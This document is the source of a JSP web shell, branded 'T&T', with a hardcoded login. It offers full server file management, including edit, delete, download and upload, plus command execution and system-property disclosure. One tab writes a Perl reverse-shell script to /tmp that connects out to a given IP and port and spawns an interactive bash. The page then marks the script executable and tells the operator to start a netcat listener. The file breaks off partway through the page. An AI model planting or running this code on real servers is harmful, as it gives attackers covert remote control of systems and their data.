<%@page contentType="text/html;charset=utf-8"%>
<%@page import="java.io.*,java.util.*,java.net.*"%>
<%
  	session.setMaxInactiveInterval(6000);
	final String URL = request.getRequestURI();
	final String isLogout = request.getParameter("isExit");
	System.out.println(isLogout);
	if("isExit".equals(isLogout)){
		session.removeAttribute("LName");
		out
					.println("<center style=font-size:12px><br><br>"
							+ "<br><br>"
							+ "<form name=login method=post>username:<input name=LName type=text size=15><br>"
							+ "password:<input name=LPass type=password size=15><br><input type=submit value=login></form></center>");
							return;
	}
	if (session.getAttribute("ID") == null) {
		// the user and pass  field  
		String username = "#$5sdk@690k";
		String password = "tdxkl";
		// the user and pass  field  
		if (request.getParameter("LName") != null
				&& request.getParameter("LPass") != null
				&& request.getParameter("LName").equals(username)
				&& request.getParameter("LPass").equals(password)) {
			session.setAttribute("ID", "1");
			response.sendRedirect(URL);
		} else {
			out
					.println("<center style=font-size:12px><br><br>"
							+ "<br><br>"
							+ "<form name=login method=post>username:<input name=LName type=text size=15><br>"
							+ "password:<input name=LPass type=password size=15><br><input type=submit value=Login></form></center>");
			
		}
		return;
	}
%>
<%!private final static int languageNo = 0; 

	String strThisFile = "";

	String strSeparator = File.separator;

	String[] authorInfo = {" <font color=red> Modified By T&T</font>",
			" <font color=red>  </font>"};

	String[] strFileManage = {"File Management", "File Management"};

	String[] strCommand = {"Command Window", "Command Window"};

	String[] strSysProperty = {"System Property", "System Property"};
	String[] strSysExit = {"exit","System Exit"};

	String[] strHelp = {"help", "Help"};

	String[] strParentFolder = {"Parent Folder", "Parent Folder"};

	String[] strCurrentFolder = {"Current Folder", "Current Folder"};

	String[] strDrivers = {"Drivers", "Drivers"};

	String[] strFileName = {"File Name", "File Name"};

	String[] strFileSize = {"File Size", "File Size"};

	String[] strLastModified = {"Last Modified", "Last Modified"};

	String[] strFileOperation = {"Operations", "Operations"};

	String[] strFileEdit = {"Edit", "Edit"};

	String[] strFileDown = {"Download", "Download"};

	String[] strFileCopy = {"Copy", "Move"};

	String[] strFileDel = {"Delete", "Delete"};

	String[] strExecute = {"Excute", "Execute"};

	String[] strBack = {"Back", "Back"};

	String[] strFileSave = {"Save", "Save"};

	public class FileHandler {

		private String strAction = "";

		private String strFile = "";

		void FileHandler(String action, String f) {
		}
	}

	public static class UploadMonitor {

		static Hashtable uploadTable = new Hashtable();

		static void set(String fName, UplInfo info) {
			uploadTable.put(fName, info);
		}

		static void remove(String fName) {
			uploadTable.remove(fName);
		}

		static UplInfo getInfo(String fName) {
			UplInfo info = (UplInfo) uploadTable.get(fName);
			return info;
		}
	}

	public class UplInfo {

		public long totalSize;

		public long currSize;

		public long starttime;

		public boolean aborted;

		public UplInfo() {
			totalSize = 0l;
			currSize = 0l;
			starttime = System.currentTimeMillis();
			aborted = false;
		}

		public UplInfo(int size) {
			totalSize = size;
			currSize = 0;
			starttime = System.currentTimeMillis();
			aborted = false;
		}

		public String getUprate() {
			long time = System.currentTimeMillis() - starttime;
			if (time != 0) {
				long uprate = currSize * 1000 / time;
				return convertFileSize(uprate) + "/s";
			} else
				return "n/a";
		}

		public int getPercent() {
			if (totalSize == 0)
				return 0;
			else
				return (int) (currSize * 100 / totalSize);
		}

		public String getTimeElapsed() {
			long time = (System.currentTimeMillis() - starttime) / 1000l;
			if (time - 60l >= 0) {
				if (time % 60 >= 10)
					return time / 60 + ":" + (time % 60) + "m";
				else
					return time / 60 + ":0" + (time % 60) + "m";
			} else
				return time < 10 ? "0" + time + "s" : time + "s";
		}

		public String getTimeEstimated() {
			if (currSize == 0)
				return "n/a";
			long time = System.currentTimeMillis() - starttime;
			time = totalSize * time / currSize;
			time /= 1000l;
			if (time - 60l >= 0) {
				if (time % 60 >= 10)
					return time / 60 + ":" + (time % 60) + "m";
				else
					return time / 60 + ":0" + (time % 60) + "m";
			} else
				return time < 10 ? "0" + time + "s" : time + "s";
		}
	}

	public class FileInfo {

		public String name = null, clientFileName = null,
				fileContentType = null;

		private byte[] fileContents = null;

		public File file = null;

		public StringBuffer sb = new StringBuffer(100);

		public void setFileContents(byte[] aByteArray) {
			fileContents = new byte[aByteArray.length];
			System.arraycopy(aByteArray, 0, fileContents, 0, aByteArray.length);
		}
	}

	// A Class with methods used to process a ServletInputStream
	public class HttpMultiPartParser {

		private final String lineSeparator = System.getProperty(
				"line.separator", "\n");

		private final int ONE_MB = 1024 * 1;

		public Hashtable processData(ServletInputStream is, String boundary,
				String saveInDir, int clength) throws IllegalArgumentException,
				IOException {
			if (is == null)
				throw new IllegalArgumentException("InputStream");
			if (boundary == null || boundary.trim().length() < 1)
				throw new IllegalArgumentException("\"" + boundary
						+ "\" is an illegal boundary indicator");
			boundary = "--" + boundary;
			StringTokenizer stLine = null, stFields = null;
			FileInfo fileInfo = null;
			Hashtable dataTable = new Hashtable(5);
			String line = null, field = null, paramName = null;
			boolean saveFiles = (saveInDir != null && saveInDir.trim().length() > 0);
			boolean isFile = false;
			if (saveFiles) { // Create the required directory (including parent dirs)
				File f = new File(saveInDir);
				f.mkdirs();
			}
			line = getLine(is);
			if (line == null || !line.startsWith(boundary))
				throw new IOException("Boundary not found; boundary = "
						+ boundary + ", line = " + line);
			while (line != null) {
				if (line == null || !line.startsWith(boundary))
					return dataTable;
				line = getLine(is);
				if (line == null)
					return dataTable;
				stLine = new StringTokenizer(line, ";\r\n");
				if (stLine.countTokens() < 2)
					throw new IllegalArgumentException(
							"Bad data in second line");
				line = stLine.nextToken().toLowerCase();
				if (line.indexOf("form-data") < 0)
					throw new IllegalArgumentException(
							"Bad data in second line");
				stFields = new StringTokenizer(stLine.nextToken(), "=\"");
				if (stFields.countTokens() < 2)
					throw new IllegalArgumentException(
							"Bad data in second line");
				fileInfo = new FileInfo();
				stFields.nextToken();
				paramName = stFields.nextToken();
				isFile = false;
				if (stLine.hasMoreTokens()) {
					field = stLine.nextToken();
					stFields = new StringTokenizer(field, "=\"");
					if (stFields.countTokens() > 1) {
						if (stFields.nextToken().trim().equalsIgnoreCase(
								"filename")) {
							fileInfo.name = paramName;
							String value = stFields.nextToken();
							if (value != null && value.trim().length() > 0) {
								fileInfo.clientFileName = value;
								isFile = true;
							} else {
								line = getLine(is); // Skip "Content-Type:" line
								line = getLine(is); // Skip blank line
								line = getLine(is); // Skip blank line
								line = getLine(is); // Position to boundary line
								continue;
							}
						}
					} else if (field.toLowerCase().indexOf("filename") >= 0) {
						line = getLine(is); // Skip "Content-Type:" line
						line = getLine(is); // Skip blank line
						line = getLine(is); // Skip blank line
						line = getLine(is); // Position to boundary line
						continue;
					}
				}
				boolean skipBlankLine = true;
				if (isFile) {
					line = getLine(is);
					if (line == null)
						return dataTable;
					if (line.trim().length() < 1)
						skipBlankLine = false;
					else {
						stLine = new StringTokenizer(line, ": ");
						if (stLine.countTokens() < 2)
							throw new IllegalArgumentException(
									"Bad data in third line");
						stLine.nextToken(); // Content-Type
						fileInfo.fileContentType = stLine.nextToken();
					}
				}
				if (skipBlankLine) {
					line = getLine(is);
					if (line == null)
						return dataTable;
				}
				if (!isFile) {
					line = getLine(is);
					if (line == null)
						return dataTable;
					dataTable.put(paramName, line);
					// If parameter is dir, change saveInDir to dir
					if (paramName.equals("dir"))
						saveInDir = line;
					line = getLine(is);
					continue;
				}
				try {
					UplInfo uplInfo = new UplInfo(clength);
					UploadMonitor.set(fileInfo.clientFileName, uplInfo);
					OutputStream os = null;
					String path = null;
					if (saveFiles)
						os = new FileOutputStream(path = getFileName(saveInDir,
								fileInfo.clientFileName));
					else
						os = new ByteArrayOutputStream(ONE_MB);
					boolean readingContent = true;
					byte previousLine[] = new byte[2 * ONE_MB];
					byte temp[] = null;
					byte currentLine[] = new byte[2 * ONE_MB];
					int read, read3;
					if ((read = is.readLine(previousLine, 0,
							previousLine.length)) == -1) {
						line = null;
						break;
					}
					while (readingContent) {
						if ((read3 = is.readLine(currentLine, 0,
								currentLine.length)) == -1) {
							line = null;
							uplInfo.aborted = true;
							break;
						}
						if (compareBoundary(boundary, currentLine)) {
							os.write(previousLine, 0, read - 2);
							line = new String(currentLine, 0, read3);
							break;
						} else {
							os.write(previousLine, 0, read);
							uplInfo.currSize += read;
							temp = currentLine;
							currentLine = previousLine;
							previousLine = temp;
							read = read3;
						}//end else
					}//end while
					os.flush();
					os.close();
					if (!saveFiles) {
						ByteArrayOutputStream baos = (ByteArrayOutputStream) os;
						fileInfo.setFileContents(baos.toByteArray());
					} else
						fileInfo.file = new File(path);
					dataTable.put(paramName, fileInfo);
					uplInfo.currSize = uplInfo.totalSize;
				}//end try
				catch (IOException e) {
					throw e;
				}
			}
			return dataTable;
		}

		/**
		 * Compares boundary string to byte array
		 */
		private boolean compareBoundary(String boundary, byte ba[]) {
			byte b;
			if (boundary == null || ba == null)
				return false;
			for (int i = 0; i < boundary.length(); i++)
				if ((byte) boundary.charAt(i) != ba[i])
					return false;
			return true;
		}

		/** Convenience method to read HTTP header lines */
		private synchronized String getLine(ServletInputStream sis)
				throws IOException {
			byte b[] = new byte[1024];
			int read = sis.readLine(b, 0, b.length), index;
			String line = null;
			if (read != -1) {
				line = new String(b, 0, read);
				if ((index = line.indexOf('\n')) >= 0)
					line = line.substring(0, index - 1);
			}
			return line;
		}

		public String getFileName(String dir, String fileName)
				throws IllegalArgumentException {
			String path = null;
			if (dir == null || fileName == null)
				throw new IllegalArgumentException("dir or fileName is null");
			int index = fileName.lastIndexOf('/');
			String name = null;
			if (index >= 0)
				name = fileName.substring(index + 1);
			else
				name = fileName;
			index = name.lastIndexOf('\\');
			if (index >= 0)
				fileName = name.substring(index + 1);
			path = dir + File.separator + fileName;
			if (File.separatorChar == '/')
				return path.replace('\\', File.separatorChar);
			else
				return path.replace('/', File.separatorChar);
		}
	} //End of class HttpMultiPartParser

	String formatPath(String p) {
		StringBuffer sb = new StringBuffer();
		for (int i = 0; i < p.length(); i++) {
			if (p.charAt(i) == '\\') {
				sb.append("\\\\");
			} else {
				sb.append(p.charAt(i));
			}
		}
		return sb.toString();
	}

	/**
	 * Converts some important chars (int) to the corresponding html string
	 */
	static String conv2Html(int i) {
		if (i == '&')
			return "&amp;";
		else if (i == '<')
			return "&lt;";
		else if (i == '>')
			return "&gt;";
		else if (i == '"')
			return "&quot;";
		else
			return "" + (char) i;
	}

	/**
	 * Converts a normal string to a html conform string
	 */
	static String htmlEncode(String st) {
		StringBuffer buf = new StringBuffer();
		for (int i = 0; i < st.length(); i++) {
			buf.append(conv2Html(st.charAt(i)));
		}
		return buf.toString();
	}

	String getDrivers()
	/*
	Get Drivers on Windows
	 */
	{
		StringBuffer sb = new StringBuffer(strDrivers[languageNo] + ":");
		File roots[] = File.listRoots();
		for (int i = 0; i < roots.length; i++) {
			sb.append("&nbsp;<a href=\"javascript:doForm('','" + roots[i]
					+ strSeparator + "','','','1','');\">");
			sb.append(roots[i] + "</a>&nbsp;");
		}
		return sb.toString();
	}

	static String convertFileSize(long filesize) {
		String strUnit = "Bytes";
		String strAfterComma = "";
		int intDivisor = 1;
		if (filesize >= 1024 * 1024) {
			strUnit = "MB";
			intDivisor = 1024 * 1024;
		} else if (filesize >= 1024) {
			strUnit = "KB";
			intDivisor = 1024;
		}
		if (intDivisor == 1)
			return filesize + " " + strUnit;
		strAfterComma = "" + 100 * (filesize % intDivisor) / intDivisor;
		if (strAfterComma == "")
			strAfterComma = ".0";
		return filesize / intDivisor + "." + strAfterComma + " " + strUnit;
	}%>
<%
	request.setCharacterEncoding("gb2312");
	String tabID = request.getParameter("tabID");
	String strDir = request.getParameter("path");
	String strAction = request.getParameter("action");
	String strFile = request.getParameter("file");
	String strPath = strDir + strSeparator + strFile;
	String strCmd = request.getParameter("cmd");
	StringBuffer sbEdit = new StringBuffer("");
	StringBuffer sbDown = new StringBuffer("");
	StringBuffer sbCopy = new StringBuffer("");
	StringBuffer sbSaveCopy = new StringBuffer("");
	StringBuffer sbNewFile = new StringBuffer("");
	String strOS = System.getProperty("os.name").toLowerCase();
	//out.print(strPath);
	if ((tabID == null) || tabID.equals("")) {
		tabID = "1";
	}
	if (strDir == null || strDir.length() < 1) {
		strDir = request.getRealPath("/");
	}
	if (strAction != null && strAction.equals("down")) {
		File downloadfile = new File(strPath);
		response.setContentType("APPLICATION/OCTET-STREAM");
		response.setHeader("Content-Disposition",
				"attachment;filename=\""
						+ strPath.substring(
								strPath.lastIndexOf("\\") + 1, strPath
										.length()) + "\"");
		FileInputStream fileInputStream = new FileInputStream(
				downloadfile);
		int totalRead = 0;
		int readBytes = 0;
		long fileLen = downloadfile.length();
		byte b[] = new byte[65000];
		response.resetBuffer();
		while ((long) totalRead < fileLen) {
			readBytes = fileInputStream.read(b);
			totalRead += readBytes;
			response.getOutputStream().write(b, 0, readBytes);
		}
		fileInputStream.close();
		out.clear();
		out = pageContext.pushBody();
	}
	if (strAction != null && strAction.equals("del")) {
		File f = new File(strPath);
		f.delete();
	}
	if (strAction != null && strAction.equals("edit")) {
		String ext = strPath.substring(strPath.lastIndexOf(".") + 1,
				strPath.length());
		if (ext.equalsIgnoreCase("txt") || ext.equalsIgnoreCase("sql")
				|| ext.equalsIgnoreCase("css")
				|| ext.equalsIgnoreCase("xml")
				|| ext.equalsIgnoreCase("tld")
				|| ext.equalsIgnoreCase("cfg")
				|| ext.equalsIgnoreCase("jsp")
				|| ext.equalsIgnoreCase("htm")
				|| ext.equalsIgnoreCase("properties")
				|| ext.equalsIgnoreCase("html")
				|| ext.equalsIgnoreCase("htm")
				|| ext.equalsIgnoreCase("js")
				|| ext.equalsIgnoreCase("ini")
				|| ext.equalsIgnoreCase("java")) {
			File f = new File(strPath);
			BufferedReader br = new BufferedReader(
					new InputStreamReader(new FileInputStream(f)));
			sbEdit
					.append("<form name='frmEdit' action='' method='POST'>\r\n");
			sbEdit
					.append("<input type=hidden name=action value=save >\r\n");
			sbEdit.append("<input type=hidden name=path value='"
					+ strDir + "' >\r\n");
			sbEdit.append("<input type=hidden name=file value='"
					+ strFile + "' >\r\n");
			sbEdit.append("<input type=submit name=save value=' "
					+ strFileSave[languageNo] + " '> ");
			sbEdit.append("<input type=button name=goback value=' "
					+ strBack[languageNo]
					+ " ' onclick='history.back(-1);'> &nbsp;"
					+ strPath + "\r\n");
			sbEdit
					.append("<br><textarea rows=30 cols=90 name=content>");
			String line = "";
			while ((line = br.readLine()) != null) {
				sbEdit.append(htmlEncode(line) + "\r\n");
			}
			br.close();
			sbEdit.append("</textarea>");
			sbEdit.append("<input type=hidden name=path value="
					+ strDir + ">");
			sbEdit.append("</form>");
		} else {
			sbEdit.append("Can not open the file :<br>");
			sbEdit.append(strPath + "<br>");
		}
	}
	if (strAction != null && strAction.equals("save")) {
		File f = new File(strPath);
		BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(
				new FileOutputStream(f)));
		String strContent = request.getParameter("content");
		bw.write(strContent);
		bw.close();
	}
	if (strAction != null && strAction.equals("copy")) {
		File f = new File(strPath);
		sbCopy
				.append("<br><form name='frmCopy' action='' method='POST'>\r\n");
		sbCopy
				.append("<input type=hidden name=action value=savecopy >\r\n");
		sbCopy.append("<input type=hidden name=path value='" + strDir
				+ "' >\r\n");
		sbCopy.append("<input type=hidden name=file value='" + strFile
				+ "' >\r\n");
		sbCopy.append("old file: " + strPath + "<p>");
		sbCopy
				.append("dest file: <input type=text name=file2 size=40 value='"
						+ strDir + "'><p>");
		sbCopy.append("<input type=submit name=save value=' "
				+ strFileCopy[languageNo] + " '> ");
		sbCopy.append("<input type=button name=goback value=' "
				+ strBack[languageNo]
				+ " ' onclick='history.back(-1);'> <p>&nbsp;\r\n");
		sbCopy.append("</form>");
	}
	if (strAction != null && strAction.equals("savecopy")) {
		File f = new File(strPath);
		String strDesFile = request.getParameter("file2");
		if (strDesFile == null || strDesFile.equals("")) {
			sbSaveCopy.append("<p><font color=red>Dest File Error.</font>");
		} else {
			File f_des = new File(strDesFile);
			if (f_des.isFile()) {
				sbSaveCopy
						.append("<p><font color=red>Dest file deleted, but Can not copy</font>");
			} else {
				String strTmpFile = strDesFile;
				if (f_des.isDirectory()) {
					if (!strDesFile.endsWith(strSeparator)) {
						strDesFile = strDesFile + strSeparator;
					}
					strTmpFile = strDesFile + "copy of " + strFile;
				}
				File f_des_copy = new File(strTmpFile);
				FileInputStream in1 = new FileInputStream(f);
				FileOutputStream out1 = new FileOutputStream(f_des_copy);
				byte[] buffer = new byte[1024];
				int c;
				while ((c = in1.read(buffer)) != -1) {
					out1.write(buffer, 0, c);
				}
				in1.close();
				out1.close();
				sbSaveCopy.append("old file: " + strPath + "<p>");
				sbSaveCopy.append("dest file: " + strTmpFile + "<p>");
				sbSaveCopy.append("<font color=red>Copy Success!</font>");
			}
		}
		sbSaveCopy
				.append("<p><input type=button name=saveCopyBack onclick='history.back(-2);' value=back>");
	}
	if (strAction != null && strAction.equals("newFile")) {
		String strF = request.getParameter("fileName");
		if (!(strF == null || strF.equals(""))) {
			File f_new = new File(strF);
			if (!f_new.mkdirs())
				sbNewFile.append(strF + " create file error.");
		} else {
			sbNewFile.append("<p><font color=red>Please input absolute path and folder name.</font>");
		}
	}
	if ((request.getContentType() != null)
			&& (request.getContentType().toLowerCase()
					.startsWith("multipart"))) {
		String tempdir = ".";
		boolean error = false;
		response.setContentType("text/html");
		HttpMultiPartParser parser = new HttpMultiPartParser();
		int bstart = request.getContentType().lastIndexOf("oundary=");
		String bound = request.getContentType().substring(bstart + 8);
		int clength = request.getContentLength();
		Hashtable ht = parser.processData(request.getInputStream(),
				bound, tempdir, clength);
		if (ht.get("cqqUploadFile") != null) {
			FileInfo fi = (FileInfo) ht.get("cqqUploadFile");
			File f1 = fi.file;
			UplInfo info = UploadMonitor.getInfo(fi.clientFileName);
			if (info != null && info.aborted) {
				f1.delete();
				request.setAttribute("error", "Upload aborted");
			} else {
				String path = (String) ht.get("path");
				if (path != null && !path.endsWith(strSeparator))
					path = path + strSeparator;
				strDir = path;
				//out.println(path + f1.getName());
				if (!f1.renameTo(new File(path + f1.getName()))) {
					request
							.setAttribute("error",
									"Cannot upload file.");
					out.println("error,upload ");
					error = true;
					f1.delete();
				}
			}
		}
	}
%>
<html>
	<head>
		<style type="text/css">
td,select,input,body {
	font-size: 9pt;
}

A {
	TEXT-DECORATION: none
}
.clear{clear:both;}
.voilet_jg dt{float:left;color:red;line-height:22px;}
.voilet_jg dd{float:right;}
#tablist {
	padding: 5px 0;
	margin-left: 0;
	margin-bottom: 0;
	margin-top: 0.1em;
	font: 9pt;
}

#tablist li {
	list-style: none;
	display: inline;
	margin: 0;
}

#tablist li a {
	padding: 3px 0.5em;
	margin-left: 3px;
	border: 1px solid;
	background: F6F6F6;
}
#tablist li form {
	padding: 3px 0.5em;
	margin-left: 3px;
	border: 1px solid;
	background: F6F6F6;
}
#tablist li a:link,#tablist li a:visited {
	color: navy;
}

#tablist li a.current {
	background: #EAEAFF;
}

#tabcontentcontainer {
	width: 100%;
	padding: 5px;
	border: 1px solid black;
}

.tabcontent {
	display: none;
}
</style>

		<script type="text/javascript">

var initialtab=[<%=tabID%>, "menu<%=tabID%>"]

////////Stop editting////////////////

function cascadedstyle(el, cssproperty, csspropertyNS){
if (el.currentStyle)
return el.currentStyle[cssproperty]
else if (window.getComputedStyle){
var elstyle=window.getComputedStyle(el, "")
return elstyle.getPropertyValue(csspropertyNS)
}
}

var previoustab=""

function expandcontent(cid, aobject){
if (document.getElementById){
highlighttab(aobject)
if (previoustab!="")
document.getElementById(previoustab).style.display="none"
document.getElementById(cid).style.display="block"
previoustab=cid
if (aobject.blur)
aobject.blur()
return false
}
else
return true
}

function highlighttab(aobject){
if (typeof tabobjlinks=="undefined")
collecttablinks()
for (i=0; i<tabobjlinks.length; i++)
tabobjlinks[i].style.backgroundColor=initTabcolor
var themecolor=aobject.getAttribute("theme")? aobject.getAttribute("theme") : initTabpostcolor
aobject.style.backgroundColor=document.getElementById("tabcontentcontainer").style.backgroundColor=themecolor
}

function collecttablinks(){
var tabobj=document.getElementById("tablist")
tabobjlinks=tabobj.getElementsByTagName("A")
}

function do_onload(){
collecttablinks()
initTabcolor=cascadedstyle(tabobjlinks[1], "backgroundColor", "background-color")
initTabpostcolor=cascadedstyle(tabobjlinks[0], "backgroundColor", "background-color")
expandcontent(initialtab[1], tabobjlinks[initialtab[0]-1])
}

if (window.addEventListener)
window.addEventListener("load", do_onload, false)
else if (window.attachEvent)
window.attachEvent("onload", do_onload)
else if (document.getElementById)
window.onload=do_onload



</script>
		<script language="javascript">

function doForm(action,path,file,cmd,tab,content)
{
	document.frmCqq.action.value=action;
	document.frmCqq.path.value=path;
	document.frmCqq.file.value=file;
	document.frmCqq.cmd.value=cmd;
	document.frmCqq.tabID.value=tab;
	document.frmCqq.content.value=content;
	if(action=="del")
	{
		if(confirm("Make Sure  to delete "+file+"?"))
		document.frmCqq.submit();
	}
	else
	{
		document.frmCqq.submit();    
	}
}
</script>

		<title>Maked by TandT</title>
		<head>


			<body>

				<form name="frmCqq" method="post" action="">
					<input type="hidden" name="action" value="">
					<input type="hidden" name="path" value="">
					<input type="hidden" name="file" value="">
					<input type="hidden" name="cmd" value="">
					<input type="hidden" name="tabID" value="2">
					<input type="hidden" name="content" value="">
				</form>

				<!--Top Menu Started-->
				<ul id="tablist">
					<li>
						<a href="#" class="current"
							onClick="return expandcontent('menu1', this)"> <%=strFileManage[languageNo]%>
						</a>
					</li>
					<li>
						<a href="#" onClick="return expandcontent('menu2', this)"> <%=strCommand[languageNo]%>
						</a>
					</li>
					<li>
						<a href="#" onClick="return expandcontent('menu3', this)"> <%=strSysProperty[languageNo]%>
						</a>
					</li>
					<li>
						<a href="#" onClick="return expandcontent('menu4', this)"> linux Prvi.
						</a>
					</li>
					<li class="voilet_post">
						<div class="voilet_jg">
							<form name=exitForm method=post><input type='hidden' name='isExit' value='isExit'/>
							<dl>
								<dt>this is test version <dt>
								<dd><input type='button' value='exit' onclick='javascript:exitForm.submit()'></dd>
							</dl>
							<div class="clear"></div>
							</form>
							
						</div>
					</li>
				</ul>
				<!--Top Menu End-->


				<%
					StringBuffer sbFolder = new StringBuffer("");
					StringBuffer sbFile = new StringBuffer("");
					int filenum = 0;
					String filelen = "";
					long filelong = 0;
					try {
						File objFile = new File(strDir);
						File list[] = objFile.listFiles();
						if (objFile.getAbsolutePath().length() > 3) {
							sbFolder
									.append("<tr><td >&nbsp;</td><td><a href=\"javascript:doForm('','"
											+ formatPath(objFile.getParentFile()
													.getAbsolutePath())
											+ "','','"
											+ strCmd + "','1','');\">");
							sbFolder.append(strParentFolder[languageNo]
									+ "</a><br>- - - - - - - - - - - </td></tr>\r\n ");
						}
						for (int i = 0; i < list.length; i++) {
							if (list[i].isDirectory()) {
								sbFolder.append("<tr><td >&nbsp;</td><td>");
								sbFolder.append("  <a href=\"javascript:doForm('','"
										+ formatPath(list[i].getAbsolutePath())
										+ "','','" + strCmd + "','1','');\">");
								sbFolder.append(list[i].getName()
										+ "</a><br></td></tr> ");
							} else {
								filenum++;
								String strLen = "";
								String strDT = "";
								long lFile = 0;
								lFile = list[i].length();
								filelong += lFile;
								strLen = convertFileSize(lFile);
								Date dt = new Date(list[i].lastModified());
								strDT = dt.toLocaleString();
								sbFile
										.append("<tr onmouseover=\"this.style.backgroundColor='#FBFFC6'\" onmouseout=\"this.style.backgroundColor='white'\"><td>");
								sbFile.append("" + list[i].getName());
								sbFile.append("</td><td>");
								sbFile.append("" + strLen);
								sbFile.append("</td><td>");
								sbFile.append("" + strDT);
								sbFile.append("</td><td>");
								sbFile.append(" <a href=\"javascript:doForm('edit','"
										+ formatPath(strDir) + "','"
										+ list[i].getName() + "','" + strCmd + "','"
										+ tabID + "','');\">");
								sbFile.append(strFileEdit[languageNo] + "</a> ");
								sbFile.append(" <a href=\"javascript:doForm('del','"
										+ formatPath(strDir) + "','"
										+ list[i].getName() + "','" + strCmd + "','"
										+ tabID + "','');\">");
								sbFile.append(strFileDel[languageNo] + "</a> ");
								sbFile.append(" <a href=\"javascript:doForm('down','"
										+ formatPath(strDir) + "','"
										+ list[i].getName() + "','" + strCmd + "','"
										+ tabID + "','');\">");
								sbFile.append(strFileDown[languageNo] + "</a> ");
								sbFile.append(" <a href=\"javascript:doForm('copy','"
										+ formatPath(strDir) + "','"
										+ list[i].getName() + "','" + strCmd + "','"
										+ tabID + "','');\">");
								sbFile.append(strFileCopy[languageNo] + "</a> ");
							}
						}
						if (filelong > 1000000) {
							filelong = filelong / 1000000;
							filelen = "<font color=#FF0000>" + filelong + "</font> M";
						} else if (filelong > 1000) {
							filelong = filelong / 1000;
							filelen = "<font color=#FF0000>" + filelong + "</font> K";
						} else {
							filelen = "<font color=#FF0000>" + filelong
									+ "</font> Byte";
						}
					} catch (Exception e) {
						out
								.println("<font color=red>Operation Failed " + e.toString()
										+ "</font>");
					}
				%>

				<DIV id="tabcontentcontainer">


					<div id="menu3" class="tabcontent">
						<%
							Properties props = System.getProperties();
						%>
						<center>
							<table cellpadding="0" cellspacing="0" border="0">
								<tr>
									<td>
										<h1><%=props.getProperty("user.name")%>
											Operation System
										</h1>
										<br>
									</td>
								</tr>
							</table>
						</center>
						<%
							out.println("<h3>OS Name:" + props.getProperty("os.name") + "  Constructor: "
									+ props.getProperty("os.arch") + "  Version :"
									+ props.getProperty("os.version") + "</h3>");
							out.println("Count Name: " + props.getProperty("user.name") + "<br>");
							out.println("User Main directory:" + props.getProperty("user.home") + "<br>");
							out.println("User Current directory" + props.getProperty("user.dir") + "<br>");
							out.println("Java Version: " + props.getProperty("java.version")
									+ "<br>");
							out.println("Java Install Path: " + props.getProperty("java.home") + "<br>");

							out.println("Java Run time version: "
									+ props.getProperty("java.specification.version") + "<br>");

							out.println("Java Library Path: " + props.getProperty("java.library.path")
									+ "<br>");
							out.println("Default Temp Path: " + props.getProperty("java.io.tmpdir")
									+ "<br>");
							out.println("Extent Directorys:" + props.getProperty("java.ext.dirs")
									+ "<br>");
							out
									.println("File Separator: " + props.getProperty("file.separator")
											+ "<br>"); 
							out
									.println("Path Separator：" + props.getProperty("path.separator")
											+ "<br>"); 
							out.println("Line Separator: " + props.getProperty("line.separator") + "<br>");
						%>
					</div>

					<div id="menu4" class="tabcontent"><!-- linux nc shell -->
					<%
					{
						try { 
							// make file 
							FileWriter writer = new FileWriter("/tmp/tst.pl"); 
							PrintWriter  pw=new PrintWriter(writer);
							pw.println("#!/usr/bin/perl -w ");
							pw.println("#modifyed by T&T");
							pw.println("use strict; ");
							pw.println("use Socket; ");
							pw.println("use IO::Handle;");
							pw.println("if($#ARGV+1 != 2){ ");
							pw.println("print \"$#ARGV $0 Remote_IP Remote_Port \\n\"; ");
							pw.println("exit 1; ");
							pw.println("}");
							pw.println("my $remote_ip = $ARGV[0]; ");
							pw.println("my $remote_port = $ARGV[1];");
							pw.println("my $proto = getprotobyname(\"tcp\"); ");
							pw.println("my $pack_addr = sockaddr_in($remote_port, inet_aton($remote_ip));");
							pw.println("my $shell = '/bin/bash -i';");
							pw.println("socket(SOCK, AF_INET, SOCK_STREAM, $proto);");
							pw.println("STDOUT->autoflush(1); ");
							pw.println("SOCK->autoflush(1);");
							pw.println("connect(SOCK,$pack_addr) or die \"can not connect:$!\";");
							pw.println("open STDIN, \"<&SOCK\"; ");
							pw.println("open STDOUT, \">&SOCK\"; ");
							pw.println("open STDERR, \">&SOCK\";");
							pw.println("print \"voilet shell\nblog:www.kukafei520.net.\\n\";");
							pw.println("system($shell); ");
							pw.println("close SOCK;");
							pw.println("exit 0;");
							pw.flush();
							writer.close();

							// change priv.
							String line = "";
							StringBuffer sbCmd = new StringBuffer("");
							String[] strShell = new String[2];
									if (strOS.startsWith("win")) {
										strShell[0] = "cmd";
										strShell[1] = "/c";
									} else {
										strShell[0] = "/bin/sh";
										strShell[1] = "-c";
									}
									String[] strCommand = new String[3];
									strCommand[0] = strShell[0];
									strCommand[1] = strShell[1];
									strCommand[2] = "chmod +x /tmp/tst.pl";
									//System.out.println(strCommand);
									Process p = Runtime.getRuntime().exec(strCommand, null,
											new File(strDir));
									BufferedReader br = new BufferedReader(
											new InputStreamReader(p.getInputStream()));
									while ((line = br.readLine()) != null) {
										sbCmd.append(line + "\r\n");
									}

						}catch (IOException iox){ 
							System.err.println(iox); 
						} 
					}
					%>
					file generated, please click CMD, excute /tst.pl IP port, example: /tstpl 127.0.0.1 1266, the start nc -l -v 1266.
					</div>


					<br>
					<div id="menu1" class="tabcontent">
						<%
							out
									.println("<table border='1' width='100%' bgcolor='#FBFFC6' cellspacing=0 cellpadding=5 bordercolorlight=#000000 bordercolordark=#FFFFFF><tr><td>"
											+ getDrivers() + "</td></tr></table>\r\n");
							out
									.println("<table border='1' width='100%' bgcolor='#FBFFC6' cellspacing=0 cellpadding=5 bordercolorlight=#000000 bordercolordark=#FFFFFF><tr><td width='30%'>"
											+ strCurrentFolder[languageNo]
											+ ":"
											+ strDir
											+ "</td></tr></table>\r\n");
						%>
						<table width="100%" border="1" cellspacing="0" cellpadding="5"
							bordercolorlight="#000000" bordercolordark="#FFFFFF">

							<tr>
								<td width="25%" align="center" valign="top">
									<table width="98%" border="0" cellspacing="0" cellpadding="3">
										<%=sbFolder%>
									</table>
									<br>
									<br>
								</td>
								<td width="81%" align="left" valign="top">

									<%
										if (strAction != null && strAction.equals("edit")) {
											out.println(sbEdit.toString());
										} else if (strAction != null && strAction.equals("copy")) {
											out.println(sbCopy.toString());
										} else if (strAction != null && strAction.equals("down")) {
											out.println(sbDown.toString());
										} else if (strAction != null && strAction.equals("savecopy")) {
											out.println(sbSaveCopy.toString());
										} else if (strAction != null && strAction.equals("newFile")
												&& !sbNewFile.toString().equals("")) {
											out.println(sbNewFile.toString());
										} else {
									%>
